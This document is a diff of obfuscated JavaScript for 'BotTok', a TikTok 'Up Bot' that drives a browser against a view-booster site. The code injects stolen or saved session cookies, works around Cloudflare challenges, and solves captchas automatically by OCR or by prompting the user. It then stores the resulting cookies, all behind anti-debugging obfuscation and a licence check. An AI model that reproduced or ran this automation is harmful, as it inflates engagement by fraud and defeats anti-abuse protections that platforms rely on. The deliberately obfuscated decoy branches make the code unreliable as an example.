-      v148.stdout.write(S + " You are being rate limited by Freer!");
+      v133.stdout.clearLine(0);
+      v134.stdout.cursorTo(0);
+      w.stdout.write(A + " SESSID: " + p);
     }
-  } else if (v139.cXeTr(v139.qZptI, v139.hBWRQ)) {
-    const v146 = v148 ? function () {
-      if (v146) {
-        const v147 = F.apply(p, arguments);
-        h = null;
-        return v147;
-      }
-    } : function () {};
-    U = false;
-    return v146;
+  } else if (v130.hQerl(v130.xcpmX, v130.BXWwX)) {
+    return null;
   } else {
-    v139.fKmbK(f53, "Cookies injected! (" + v93 + ")");
+    v130.vGOfn(f54, "Cookies injected! (" + v93 + ")");
   }
-  v139.CICEB(f53, "Load session (SESSID: " + v76 + ")...");
-  await v139.RxMNV(f52, 3000);
-  const v148 = await p229.content();
-  if (/_cf_chl_opt/.test(v148)) {
-    if (v139.uKHCe(v139.wXwcB, v139.VhCWj)) {
-      await v139.anDor(f30);
-      await v139.YdXmq(f52, 300);
-      await v139.ltFfp(f43);
-      return await v139.CICEB(f10, p229);
-    } else {
-      v139.YdXmq(B, "[" + r + "] " + J + " (+" + A + ") [" + F + "] Accumulation limit reached! (in " + v139.YjjlZ(p) + " mins)");
-      if (!h) {
-        W.stdout.clearLine(0);
-        R.stdout.cursorTo(0);
-        o.stdout.write(E + " Accumulation limit reached!");
+  v130.MMCOz(f54, "Load session (SESSID: " + v74 + ")...");
+  await v130.HuULq(f53, 3000);
+  const v134 = await p199.content();
+  if (/_cf_chl_opt/.test(v134)) {
+    if (v130.hQerl(v130.kLEQK, v130.lCQPh)) {
+      let v135 = [];
+      for (let v136 = 0; v130.nQIyN(v136, v132.length); v136 += 64) {
+        v135.push(v134.slice(v136, v130.SqwnU(v136, 64)));
       }
-      u.exit(0);
+      return v135;
+    } else {
+      await v130.efYJs(f31);
+      await v130.ancHj(f53, 1000);
+      await v130.efYJs(f44);
+      return await v130.KEgFx(f10, p199);
     }
   }
-  if (/submit-captcha/.test(v148)) {
-    if (v139.AWUmS(v139.bguTv, v139.bguTv)) {
-      if (v139.cXeTr(vA0zS[v139.hldOQ], "")) {
-        if (v139.kohuO(v139.KdWeP, v139.mKjuk)) {
-          return false;
-        } else {
-          await v139.uefPV(f11, p229);
-        }
-      } else if (v139.ZgNfe(v139.GZLYX, v139.GZLYX)) {
-        B.stdout.moveCursor(0, -3);
-        r.stdout.clearScreenDown();
-        J.stdout.write("\n" + A + "[33m " + F + " [34m[" + p + "][0m " + h + "  [90m(" + v139.YjjlZ(g) + " /hr " + v139.BwMhQ(v139.YjjlZ(T), 60).toFixed(2) + " hrs)[0m\n\n");
-        s.stdout.write(H + " Running: Trying again (ERROR: " + u.substring(0, 22) + ")...");
+  if (/submit-captcha/.test(v134)) {
+    if (v130.hQerl(v130.eFHpz, v130.KXRTk)) {
+      v130.log(v131);
+      return false;
+    } else if (v130.ripQY(vA0iw[v130.AFdFB], "")) {
+      if (v130.xJsll(v130.qMMfS, v130.gcLYF)) {
+        await v130.OFugq(f11, p199);
       } else {
-        await v139.UXgRm(f12, p229);
+        v133.info("BotTok " + v134 + " TikTok Up Bot (by @DevMHOne)\n\n", v130.yBwpE, v130.JrrEa, v130.sVBcl, w + " Buy license in[35m " + A + "[0m\n");
+        p.exit(0);
       }
+    } else if (v130.LizIz(v130.CBLPi, v130.tlCge)) {
+      await v130.MwhOE(f12, p199);
     } else {
-      if (!v148) {
-        B.stdout.moveCursor(0, -4);
-        r.stdout.clearScreenDown();
-        J.log(A);
-      }
-      U.exit(0);
+      return false;
     }
   }
-  return p229;
+  return p199;
 }
-async function f11(p279) {
-  const v149 = {
-    GDfuC: function (p280, p281) {
-      return p280(p281);
+(function () {
+  const v137 = {
+    DUYri: function (p244, p245) {
+      return p244 === p245;
     },
-    knAMZ: function (p282, p283) {
-      return p282 < p283;
+    Npfjq: function (p246, p247) {
+      return p246 - p247;
     },
-    abiAL: function (p284, p285, p286) {
-      return p284(p285, p286);
+    sdZvR: function (p248, p249) {
+      return p248 !== p249;
     },
-    yTNmo: function (p287, p288) {
-      return p287(p288);
+    mDacM: "GyVbn",
+    ZxdSL: "vkDAJ",
+    tetCS: function (p250, p251) {
+      return p250 !== p251;
     },
-    mrLsO: function (p289, p290) {
-      return p289 === p290;
+    YRnst: "ycfBW",
+    qpEez: function (p252, p253) {
+      return p252(p253);
     },
-    yyzdu: "[36m",
-    RYYuF: "[0m",
-    MfOeE: function (p291, p292) {
-      return p291 !== p292;
+    VVMnu: function (p254, p255) {
+      return p254 + p255;
     },
-    BBaYq: "WtmFG",
-    XKEZi: "lCVhj",
-    YZjfb: "mINIX",
-    dEMZl: function (p293, p294) {
-      return p293(p294);
+    DXsEn: function (p256, p257) {
+      return p256 + p257;
     },
-    alXuY: function (p295, p296) {
-      return p295 - p296;
-    },
-    DKfQM: "kgSFd",
-    LCOQb: "QXWYR",
-    lQqFs: "input",
-    RqGZV: "captcha",
-    NRYvL: "Write a Captcha:",
-    gdBor: "input[type=text]",
-    NHgXm: function (p297, p298) {
-      return p297 === p298;
-    },
-    VelvW: "NAQqq",
-    nYpVt: "dqLtd",
-    euudP: function (p299, p300) {
-      return p299 !== p300;
-    },
-    nINZt: "HoujF",
-    QAhmt: "etNpk",
-    PdpDC: function (p301, p302) {
-      return p301(p302);
-    },
-    GMSZp: function (p303, p304) {
-      return p303(p304);
-    },
-    pyepc: function (p305, p306) {
-      return p305 === p306;
-    },
-    PDIKC: "jOycC",
-    UhtgP: "yMzHW",
-    nKLQv: function (p307, p308) {
-      return p307 === p308;
-    },
-    HrTLd: "YuVSj",
-    tJTfT: function (p309, p310) {
-      return p309(p310);
-    },
-    iBVKD: function (p311, p312) {
-      return p311(p312);
+    myPQw: "return (function() ",
+    alDyp: "{}.constructor(\"return this\")( )",
+    ZPlwT: "iwNoa",
+    lUfFy: function (p258) {
+      return p258();
     }
   };
-  if (!v26) {
-    if (v149.MfOeE(v149.BBaYq, v149.BBaYq)) {
-      const v150 = v149.GDfuC(v149, v157);
-      const v151 = v150.text();
-      const v152 = v151.match(/"liveRoomStats":\s*{\s*"userCount":\s*(\d+)/);
-      if (v152) {
-        const v153 = v149.GDfuC(v159, v152[1]);
-        return v153;
+  const vF3 = function () {
+    if (v137.sdZvR(v137.mDacM, v137.ZxdSL)) {
+      let v138;
+      try {
+        if (v137.tetCS(v137.YRnst, v137.YRnst)) {
+          if (v137.DUYri(z, 0)) {
+            D = l;
+          } else {
+            M = v137.Npfjq(q, o);
+          }
+        } else {
+          v138 = v137.qpEez(Function, v137.VVMnu(v137.DXsEn(v137.myPQw, v137.alDyp), ");"))();
+        }
+      } catch (a) {
+        if (v137.DUYri(v137.ZPlwT, v137.ZPlwT)) {
+          v138 = window;
+        } else {
+          a.stdout.clearLine(0);
+          z.stdout.cursorTo(0);
+          w.stdout.write(A + " SESSID: " + p);
+        }
       }
+      return v138;
     } else {
+      const v139 = H.apply(c, arguments);
+      a = null;
+      return v139;
+    }
+  };
+  const v140 = v137.lUfFy(vF3);
+  v140.setInterval(f92, 1000);
+})();
+async function f11(p259) {
+  const v141 = {
+    ImVTg: "--disable-gpu",
+    rutal: "--disable-gpu-compositing",
+    qhpHe: function (p260, p261) {
+      return p260(p261);
+    },
+    wlfZb: function (p262, p263) {
+      return p262(p263);
+    },
+    wDOoN: function (p264, p265) {
+      return p264 - p265;
+    },
+    pvjWN: function (p266, p267) {
+      return p266 + p267;
+    },
+    fnYSt: "Executable not found in the following path:\n",
+    oBqyO: "Use the -b flag to set the path to the browser.",
+    TYwtH: function (p268, p269) {
+      return p268 !== p269;
+    },
+    ONINC: "DyRKx",
+    rGJXa: "jhSue",
+    BfEbq: function (p270, p271) {
+      return p270 !== p271;
+    },
+    qqrIb: "TSUWF",
+    xxSzZ: "FNiMH",
+    npAvI: function (p272, p273) {
+      return p272(p273);
+    },
+    WXSVi: function (p274, p275) {
+      return p274 - p275;
+    },
+    WLZld: function (p276, p277) {
+      return p276 !== p277;
+    },
+    xwNpx: "HYSbD",
+    aIrLp: "SClnw",
+    ClRcw: "input",
+    TgfIO: "captcha",
+    ISOSY: "Write a Captcha:",
+    OOWHX: "input[type=text]",
+    yilqw: "COwiI",
+    SZNhH: "oCtpb",
+    dPSXX: function (p278, p279) {
+      return p278(p279);
+    },
+    yJVpX: function (p280, p281) {
+      return p280 === p281;
+    },
+    uxedJ: "BrFks",
+    NkAtt: "yYOoT",
+    rGwzc: function (p282, p283) {
+      return p282 === p283;
+    },
+    OFnyk: "aPQyw",
+    mNioL: function (p284, p285) {
+      return p284(p285);
+    },
+    aghmG: function (p286, p287) {
+      return p286 !== p287;
+    },
+    pwUVU: "dFbQX",
+    PcaDv: "hSbUm",
+    EqOHQ: "XUjtn",
+    jwNUu: "bPwBj",
+    eftzL: "gYNKX",
+    BxdVn: function (p288, p289) {
+      return p288(p289);
+    }
+  };
+  if (!v28) {
+    if (v141.TYwtH(v141.ONINC, v141.rGJXa)) {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v63 + " Solve the captcha manually...");
+      process.stdout.write(v61 + " Solve the captcha manually...");
+    } else {
+      p259.log(v141);
     }
-  } else if (v149.mrLsO(v149.XKEZi, v149.YZjfb)) {
-    let v154 = "";
-    for (let v155 = 0; v149.knAMZ(v155, t.length); v155 += 2) {
-      v154 += B.fromCharCode(v149.abiAL(r, J.substr(v155, 2), 16));
-    }
-    return v154;
+  } else if (v141.BfEbq(v141.qqrIb, v141.xxSzZ)) {
+    v141.npAvI(f54, "Solve the captcha manually...");
   } else {
-    v149.dEMZl(f53, "Solve the captcha manually...");
+    return true;
   }
-  await p279.evaluate("(() => {\n      const button = document.querySelector(\"button.fc-button.fc-cta-consent.fc-primary-button\");\n      if (button) {\n        button.click();\n      }\n    })();");
-  await v149.yTNmo(f52, 300);
-  await p279.screenshot({
-    path: v40,
+  await p259.evaluate("(() => {\n      const button = document.querySelector(\"button.fc-button.fc-cta-consent.fc-primary-button\");\n      if (button) {\n        button.click();\n      }\n    })();");
+  await v141.npAvI(f53, 1000);
+  await p259.screenshot({
+    path: v38,
     clip: {
       x: 255,
       y: 342,
-      width: v149.alXuY(274, 60),
+      width: v141.WXSVi(274, 60),
       height: 126
     }
   });
-  if (!v26) {
-    if (v149.MfOeE(v149.DKfQM, v149.LCOQb)) {
+  if (!v28) {
+    if (v141.WLZld(v141.xwNpx, v141.aIrLp)) {
       console.log("\n");
-      console.log(await a0zt.file(v40, {
+      console.log(await a0iA.file(v38, {
         width: 64
       }));
     } else {
-      v149.GDfuC(v157, "Solve captcha automatically...");
+      v143.exit(0);
     }
   }
-  const v157 = {
-    type: v149.lQqFs,
-    name: v149.RqGZV,
-    message: v149.NRYvL
+  const v143 = {
+    type: v141.ClRcw,
+    name: v141.TgfIO,
+    message: v141.ISOSY
   };
-  const v158 = await a0zv.prompt([v157]);
-  const v159 = v158.captcha;
-  await a0zd.promises.unlink(v40);
-  await p279.waitForSelector(v149.gdBor);
-  await p279.$eval(v149.gdBor, (p313, p314) => p313.value = p314, v159);
-  await p279.evaluate("(() => {\n      document\n        .querySelector(\"button.btn.btn-primary.btn-lg.btn-block\")\n        .click();\n    })();");
-  if (!v26) {
-    if (v149.NHgXm(v149.VelvW, v149.VelvW)) {
+  const v144 = await a0iH.prompt([v143]);
+  const v145 = v144.captcha;
+  await a0ic.promises.unlink(v38);
+  await p259.waitForSelector(v141.OOWHX);
+  await p259.$eval(v141.OOWHX, (p290, p291) => p290.value = p291, v145);
+  await p259.evaluate("(() => {\n      document\n        .querySelector(\"button.btn.btn-primary.btn-lg.btn-block\")\n        .click();\n    })();");
+  if (!v28) {
+    if (v141.BfEbq(v141.yilqw, v141.SZNhH)) {
       process.stdout.moveCursor(0, -23);
       process.stdout.clearScreenDown();
     } else {
-      v149.GDfuC(v160, "[" + t + "] " + V + " (+" + I + ") " + U);
-      v149.yTNmo(B, r);
+      p259 = [...v141, v141.ImVTg, v141.rutal];
     }
   }
-  await p279.waitForNavigation();
-  const v160 = v149.GDfuC(parseInt, await p279.evaluate("(() => {\n      return document.querySelector('#errorcapthcaclose') === null ? 1 : 0;\n    })();"));
-  if (v160) {
-    if (v149.NHgXm(v149.nYpVt, v149.nYpVt)) {
-      if (!v26) {
-        if (v149.euudP(v149.nINZt, v149.nINZt)) {
-          if (v149.mrLsO(v157.v, 0)) {
-            return false;
+  await p259.waitForNavigation();
+  const v146 = v141.dPSXX(parseInt, await p259.evaluate("(() => {\n      return document.querySelector('#errorcapthcaclose') === null ? 1 : 0;\n    })();"));
+  if (v146) {
+    if (v141.yJVpX(v141.uxedJ, v141.uxedJ)) {
+      if (!v28) {
+        if (v141.BfEbq(v141.NkAtt, v141.NkAtt)) {
+          const v147 = v141.qhpHe(p259, v141);
+          if (!v147.ok) {
+            return null;
           }
-          return true;
+          const v148 = v147.text();
+          const v149 = v148.match(/"canonical":"https:\\u002F\\u002Fwww\.tiktok\.com\\u002F@\w+\\u002F(?:video|photo)\\u002F(\d+)"/);
+          if (v149 && v149[1]) {
+            return v149[1];
+          } else {
+            return null;
+          }
         } else {
           process.stdout.clearLine(0);
           process.stdout.cursorTo(0);
-          process.stdout.write(v61 + " Captcha resolved! (" + v159 + ")");
+          process.stdout.write(v59 + " Captcha resolved! (" + v145 + ")");
         }
-      } else if (v149.euudP(v149.QAhmt, v149.QAhmt)) {
-        return null;
+      } else if (v141.rGwzc(v141.OFnyk, v141.OFnyk)) {
+        v141.wlfZb(f54, "Captcha resolved! (" + v145 + ")");
       } else {
-        v149.PdpDC(f53, "Captcha resolved! (" + v159 + ")");
+        return v141.wlfZb(v143, v141.wlfZb(v144, v141.qhpHe(v145, v146)));
       }
-      const v161 = await p279.cookies();
-      await v149.GMSZp(f28, v161);
-      await v149.GDfuC(f52, 2000);
+      const v150 = await p259.cookies();
+      await v141.mNioL(f29, v150);
+      await v141.dPSXX(f53, 2000);
     } else {
-      v157.log(v149.yyzdu, "                                                          \n@@@@@@@    @@@@@@   @@@@@@@   @@@@@@@   @@@@@@   @@@  @@@  \n@@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@  \n@@!  @@@  @@!  @@@    @@!       @@!    @@!  @@@  @@!  !@@  \n!@   @!@  !@!  @!@    !@!       !@!    !@!  @!@  !@!  @!!  \n@!@!@!@   @!@  !@!    @!!       @!!    @!@  !@!  @!@@!@!   \n!!!@!!!!  !@!  !!!    !!!       !!!    !@!  !!!  !!@!!!    \n!!:  !!!  !!:  !!!    !!:       !!:    !!:  !!!  !!: :!!   \n:!:  !:!  :!:  !:!    :!:       :!:    :!:  !:!  :!:  !:!  \n:: ::::  ::::: ::     ::        ::    ::::: ::   ::  :::  \n:: : ::    : :  :      :         :      : :  :    :   :::", "\n\nBotTok " + v158 + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", v149.RYYuF);
-      v159.log(v160 + " Find help in Telegram (https://t.me/bottok_help)\n");
+      v141 = v141.wDOoN(v143, v144);
     }
-  } else if (v149.pyepc(v149.PDIKC, v149.PDIKC)) {
-    if (!v26) {
-      if (v149.euudP(v149.UhtgP, v149.UhtgP)) {
-        v157 = "";
-      } else {
+  } else if (v141.aghmG(v141.pwUVU, v141.PcaDv)) {
+    if (!v28) {
+      if (v141.WLZld(v141.EqOHQ, v141.jwNUu)) {
         process.stdout.clearLine(0);
         process.stdout.cursorTo(0);
-        process.stdout.write(v62 + " Wrong captcha! (" + v159 + ")");
+        process.stdout.write(v60 + " Wrong captcha! (" + v145 + ")");
+      } else {
+        v145.stdout.clearLine(0);
+        v146.stdout.cursorTo(0);
+        A.stdout.write(v141.pvjWN(p, " Chrome/Chromium executable is invalid!"));
+        C.info("\n\n", v141.fnYSt, "\"" + J + "\"\n", v141.oBqyO);
       }
-    } else if (v149.nKLQv(v149.HrTLd, v149.HrTLd)) {
-      v149.yTNmo(f53, "Wrong captcha! (" + v159 + ")");
+    } else if (v141.BfEbq(v141.eftzL, v141.eftzL)) {
+      return null;
     } else {
-      v149.yTNmo(p279, "Wrong captcha! (" + v149 + ")");
+      v141.mNioL(f54, "Wrong captcha! (" + v145 + ")");
     }
-    await v149.tJTfT(f52, 2000);
-    await v149.iBVKD(f11, p279);
+    await v141.wlfZb(f53, 2000);
+    await v141.BxdVn(f11, p259);
   } else {
-    v157.stdout.clearLine(0);
-    v158.stdout.cursorTo(0);
-    v159.stdout.write(v160 + " You are being rate limited by Freer!");
+    p259 = v141;
   }
 }
-async function f12(p315) {
-  const v162 = {
-    eDQMn: function (p316, p317) {
-      return p316 + p317;
+async function f12(p292) {
+  const v151 = {
+    BIDcr: function (p293, p294) {
+      return p293(p294);
     },
-    bIzzm: " Cookies invalid/expired!",
-    VdMKb: function (p318, p319) {
-      return p318(p319);
+    cegRZ: function (p295, p296) {
+      return p295 + p296;
     },
-    vtfaN: function (p320, p321) {
-      return p320 && p321;
+    vSiNj: "return (function() ",
+    IHyia: "{}.constructor(\"return this\")( )",
+    rPvzo: "function *\\( *\\)",
+    gjieg: "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)",
+    LXAoi: "init",
+    qBnVS: "chain",
+    TzWnh: "input",
+    wuOwO: function (p297, p298) {
+      return p297(p298);
     },
-    byVoZ: function (p322, p323) {
-      return p322 === p323;
+    REfHV: function (p299) {
+      return p299();
     },
-    ZFsyX: "lhRxj",
-    RQnib: "TXSZt",
-    nLBDW: function (p324, p325) {
-      return p324 + p325;
+    cVqdT: function (p300, p301, p302) {
+      return p300(p301, p302);
     },
-    pJNnC: " Solve captcha automatically...",
-    oxLTi: function (p326, p327) {
-      return p326 !== p327;
+    WDslH: "[36m",
+    ZyRaL: "[0m",
+    efSiT: "Service disabled now",
+    ihcKc: function (p303, p304) {
+      return p303 + p304;
     },
-    MFeWT: "KPgQK",
-    cuBsb: "vuVXm",
-    CAKwf: function (p328, p329) {
-      return p328(p329);
+    eiBdV: function (p305, p306) {
+      return p305 && p306;
     },
-    eKSEQ: function (p330, p331) {
-      return p330(p331);
+    IJlsN: function (p307, p308) {
+      return p307 !== p308;
     },
-    ADqcO: function (p332, p333) {
-      return p332 + p333;
+    oseNv: "duWiH",
+    WNpxo: "avGCE",
+    IYddx: function (p309, p310) {
+      return p309 + p310;
     },
-    uLPoP: function (p334, p335) {
-      return p334 - p335;
+    SxFNT: " Solve captcha automatically...",
+    SGVgV: function (p311, p312) {
+      return p311 !== p312;
     },
-    cVsfo: function (p336, p337) {
-      return p336(p337);
+    gLgYP: "XCkBZ",
+    hycJc: function (p313, p314) {
+      return p313(p314);
     },
-    kFuEV: "input[type=text]",
-    xHOfq: function (p338, p339) {
-      return p338(p339);
+    KCRSC: function (p315, p316) {
+      return p315 - p316;
     },
-    aAglE: "TJDaS",
-    Pqkug: "OcNrV",
-    uZeby: "nbWpP",
-    SpDvm: "eDAOb",
-    JtLaz: "MqqKE",
-    skrVh: function (p340, p341) {
-      return p340(p341);
+    wmFmr: function (p317, p318) {
+      return p317(p318);
     },
-    IjMaM: function (p342, p343) {
-      return p342(p343);
+    ACuiK: "input[type=text]",
+    MfNnb: function (p319, p320) {
+      return p319(p320);
     },
-    eXWuv: function (p344, p345) {
-      return p344 === p345;
+    CxsDo: "pziKT",
+    XDLdA: "zrWAn",
+    fLFYu: function (p321, p322) {
+      return p321 && p322;
     },
-    Toaad: "scFvY",
-    YVqSo: "XypiE",
-    zzFlw: "xNfiT",
-    AIOhj: "eIIFW",
-    BeBnB: function (p346, p347) {
-      return p346(p347);
+    XSrDM: function (p323, p324) {
+      return p323 === p324;
+    },
+    tFDJr: "LJzNt",
+    pBFan: "YlORO",
+    sxBDs: function (p325, p326) {
+      return p325 !== p326;
+    },
+    FfUHx: "BsRbm",
+    PFXwm: "gbTpz",
+    laaHM: function (p327, p328) {
+      return p327(p328);
+    },
+    UFmhf: function (p329, p330) {
+      return p329 !== p330;
+    },
+    hdXCE: "nZNnn",
+    XiAIw: function (p331, p332) {
+      return p331 && p332;
+    },
+    tRgEK: function (p333, p334) {
+      return p333 !== p334;
+    },
+    FuDVa: "bRJRA",
+    BYwVH: function (p335, p336) {
+      return p335 === p336;
+    },
+    wZGLX: "nuUdU",
+    PwvLJ: function (p337, p338) {
+      return p337(p338);
+    },
+    DbTmq: function (p339, p340) {
+      return p339(p340);
     }
   };
-  const v163 = v162.eDQMn(Math.random().toString(36).substring(2, 10), "-");
-  if (v162.vtfaN(!v26, !v29)) {
-    if (v162.byVoZ(v162.ZFsyX, v162.RQnib)) {
-      v165.stdout.clearLine(0);
-      N.stdout.cursorTo(0);
-      C.stdout.write(v162.eDQMn(S, v162.bIzzm));
-    } else {
+  const v152 = v151.ihcKc(Math.random().toString(36).substring(2, 10), "-");
+  if (v151.eiBdV(!v28, !v31)) {
+    if (v151.IJlsN(v151.oseNv, v151.WNpxo)) {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v162.nLBDW(v66, v162.pJNnC));
+      process.stdout.write(v151.IYddx(v64, v151.SxFNT));
+    } else {
+      let v153;
+      try {
+        v153 = fxxdAI.BIDcr(v159, fxxdAI.cegRZ(fxxdAI.cegRZ(fxxdAI.vSiNj, fxxdAI.IHyia), ");"))();
+      } catch (p) {
+        v153 = v153;
+      }
+      return v153;
     }
-  } else if (v162.oxLTi(v162.MFeWT, v162.cuBsb)) {
-    v162.CAKwf(f53, "Solve captcha automatically...");
+  } else if (v151.SGVgV(v151.gLgYP, v151.gLgYP)) {
+    const v154 = {
+      qocrK: fxxdAI.rPvzo,
+      YLjfR: fxxdAI.gjieg,
+      ROoxs: function (p341, p342) {
+        return fxxdAI.BIDcr(p341, p342);
+      },
+      XhdZZ: fxxdAI.LXAoi,
+      oanjE: function (p343, p344) {
+        return fxxdAI.cegRZ(p343, p344);
+      },
+      nBqUk: fxxdAI.qBnVS,
+      mryTb: fxxdAI.TzWnh,
+      EzAJJ: function (p345, p346) {
+        return fxxdAI.wuOwO(p345, p346);
+      },
+      IQuWP: function (p347) {
+        return fxxdAI.REfHV(p347);
+      }
+    };
+    fxxdAI.cVqdT(a, this, function () {
+      const v155 = new C(v154.qocrK);
+      const v156 = new J(v154.YLjfR, "i");
+      const v157 = v154.ROoxs(D, v154.XhdZZ);
+      if (!v155.test(v154.oanjE(v157, v154.nBqUk)) || !v156.test(v154.oanjE(v157, v154.mryTb))) {
+        v154.EzAJJ(v157, "0");
+      } else {
+        v154.IQuWP(M);
+      }
+    })();
   } else {
-    return v162[1];
+    v151.hycJc(f54, "Solve captcha automatically...");
   }
-  await p315.evaluate("(() => {\n      const button = document.querySelector(\"button.fc-button.fc-cta-consent.fc-primary-button\");\n      if (button) {\n        button.click();\n      }\n    })();");
-  await v162.eKSEQ(f52, 300);
-  await p315.screenshot({
-    path: v162.ADqcO(v163, v40),
+  await p292.evaluate("(() => {\n      const button = document.querySelector(\"button.fc-button.fc-cta-consent.fc-primary-button\");\n      if (button) {\n        button.click();\n      }\n    })();");
+  await v151.BIDcr(f53, 1000);
+  await p292.screenshot({
+    path: v151.cegRZ(v152, v38),
     clip: {
       x: 255,
       y: 342,
-      width: v162.uLPoP(274, 60),
+      width: v151.KCRSC(274, 60),
       height: 126
     }
   });
-  await v162.VdMKb(f52, 200);
-  const v164 = await v162.cVsfo(f61, (await v162.VdMKb(f13, v162.eDQMn(v163, v40))).replace(/(\r\n|\n|\r| )/gm, ""));
-  await a0zd.promises.unlink(v162.nLBDW(v163, v40));
-  await p315.waitForSelector(v162.kFuEV);
-  await p315.$eval(v162.kFuEV, (p348, p349) => p348.value = p349, v164);
-  await p315.evaluate("(() => {\n      document\n        .querySelector(\"button.btn.btn-primary.btn-lg.btn-block\")\n        .click();\n    })();");
-  await p315.waitForNavigation();
-  const v165 = v162.xHOfq(parseInt, await p315.evaluate("(() => {\n      return document.querySelector('#errorcapthcaclose') === null ? 1 : 0;\n    })();"));
-  if (v165) {
-    if (v162.oxLTi(v162.aAglE, v162.Pqkug)) {
-      if (v162.vtfaN(!v26, !v29)) {
-        if (v162.oxLTi(v162.uZeby, v162.uZeby)) {
-          v163.log(v164);
+  await v151.BIDcr(f53, 200);
+  const v158 = await v151.wmFmr(f62, (await v151.BIDcr(f13, v151.IYddx(v152, v38))).replace(/(\r\n|\n|\r| )/gm, ""));
+  await a0ic.promises.unlink(v151.IYddx(v152, v38));
+  await p292.waitForSelector(v151.ACuiK);
+  await p292.$eval(v151.ACuiK, (p348, p349) => p348.value = p349, v158);
+  await p292.evaluate("(() => {\n      document\n        .querySelector(\"button.btn.btn-primary.btn-lg.btn-block\")\n        .click();\n    })();");
+  await p292.waitForNavigation();
+  const v159 = v151.MfNnb(parseInt, await p292.evaluate("(() => {\n      return document.querySelector('#errorcapthcaclose') === null ? 1 : 0;\n    })();"));
+  if (v159) {
+    if (v151.SGVgV(v151.CxsDo, v151.XDLdA)) {
+      if (v151.fLFYu(!v28, !v31)) {
+        if (v151.XSrDM(v151.tFDJr, v151.pBFan)) {
+          if (v160) {
+            M.log(v151.WDslH, "                                                          \nBotTok " + q + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", v151.ZyRaL);
+          } else {
+            o.log(v151.WDslH, "                                                          \n@@@@@@@    @@@@@@   @@@@@@@   @@@@@@@   @@@@@@   @@@  @@@  \n@@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@  \n@@!  @@@  @@!  @@@    @@!       @@!    @@!  @@@  @@!  !@@  \n!@   @!@  !@!  @!@    !@!       !@!    !@!  @!@  !@!  @!!  \n@!@!@!@   @!@  !@!    @!!       @!!    @!@  !@!  @!@@!@!   \n!!!@!!!!  !@!  !!!    !!!       !!!    !@!  !!!  !!@!!!    \n!!:  !!!  !!:  !!!    !!:       !!:    !!:  !!!  !!: :!!   \n:!:  !:!  :!:  !:!    :!:       :!:    :!:  !:!  :!:  !:!  \n:: ::::  ::::: ::     ::        ::    ::::: ::   ::  :::  \n:: : ::    : :  :      :         :      : :  :    :   :::", "\n\nBotTok " + L + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", v151.ZyRaL);
+            T.log(Q + " Find help in Telegram (https://t.me/bottok_help)\n");
+          }
         } else {
           process.stdout.clearLine(0);
           process.stdout.cursorTo(0);
-          process.stdout.write(v61 + " Captcha resolved! (" + v164 + ")");
+          process.stdout.write(v59 + " Captcha resolved! (" + v158 + ")");
         }
-      } else if (v162.byVoZ(v162.SpDvm, v162.JtLaz)) {
-        v164.log(v165);
-        N.exit(0);
+      } else if (v151.sxBDs(v151.FfUHx, v151.PFXwm)) {
+        v151.laaHM(f54, "Captcha resolved! (" + v158 + ")");
       } else {
-        v162.skrVh(f53, "Captcha resolved! (" + v164 + ")");
+        v151.wuOwO(v151, "Solve the captcha manually...");
       }
-      const v166 = await p315.cookies();
-      await v162.VdMKb(f28, v166);
-      await v162.IjMaM(f52, 2000);
+      const v160 = await p292.cookies();
+      await v151.wmFmr(f29, v160);
+      await v151.MfNnb(f53, 2000);
     } else {
-      v165 = v162.VdMKb(N, C) || S;
+      v151.log("Cloudflare Valid / Freer Expired");
     }
-  } else if (v162.eXWuv(v162.Toaad, v162.Toaad)) {
-    if (v162.vtfaN(!v26, !v29)) {
-      if (v162.oxLTi(v162.YVqSo, v162.YVqSo)) {
-        v162.VdMKb(v163, "Wrong captcha! (" + v164 + ")");
+  } else if (v151.UFmhf(v151.hdXCE, v151.hdXCE)) {
+    a.stdout.clearLine(0);
+    z.stdout.cursorTo(0);
+    w.stdout.write(A + " Wrong captcha! (" + p + ")");
+  } else {
+    if (v151.XiAIw(!v28, !v31)) {
+      if (v151.tRgEK(v151.FuDVa, v151.FuDVa)) {
+        v151 = v151.efSiT;
       } else {
         process.stdout.clearLine(0);
         process.stdout.cursorTo(0);
-        process.stdout.write(v62 + " Wrong captcha! (" + v164 + ")");
+        process.stdout.write(v60 + " Wrong captcha! (" + v158 + ")");
       }
-    } else if (v162.oxLTi(v162.zzFlw, v162.AIOhj)) {
-      v162.BeBnB(f53, "Wrong captcha! (" + v164 + ")");
+    } else if (v151.BYwVH(v151.wZGLX, v151.wZGLX)) {
+      v151.PwvLJ(f54, "Wrong captcha! (" + v158 + ")");
     } else {
-      N = C ? v162.VdMKb(S, t[0].replace(/[,\.]/g, "")) : V;
+      return new v158(p350 => z(p350, w));
     }
-    await v162.BeBnB(f52, 2000);
-    await v162.eKSEQ(f12, p315);
-  } else {
-    N.stdout.clearLine(0);
-    C.stdout.cursorTo(0);
-    S.stdout.write(t + " Wrong captcha! (" + V + ")");
+    await v151.PwvLJ(f53, 2000);
+    await v151.DbTmq(f12, p292);
   }
 }
-async function f13(p350) {
-  const v167 = {
-    nPanI: function (p351) {
-      return p351();
+async function f13(p351) {
+  const v161 = {
+    zJSEu: function (p352, p353) {
+      return p352(p353);
     },
-    SNHCF: function (p352, p353) {
-      return p352 / p353;
+    Twusx: function (p354, p355) {
+      return p354 !== p355;
     },
-    vVjms: function (p354, p355) {
-      return p354 === p355;
+    KvZfV: "YbZWe",
+    FFfZR: function (p356, p357) {
+      return p356 === p357;
     },
-    rBPkp: "eSHNC",
-    UFehp: "vdSHn",
-    qPunT: function (p356, p357) {
-      return p356(p357);
-    },
-    VeLql: function (p358, p359) {
-      return p358(p359);
-    },
-    uWbti: function (p360, p361) {
-      return p360(p361);
-    },
-    vIcWS: function (p362, p363) {
-      return p362(p363);
-    },
-    CCVmL: function (p364, p365) {
-      return p364 !== p365;
-    },
-    nurTW: "LyjPi",
-    YeYsA: "TiQin",
-    YraOY: "eng"
+    qHRuS: "fohvJ",
+    vDcIx: "atyOF",
+    dIwTD: "eng"
   };
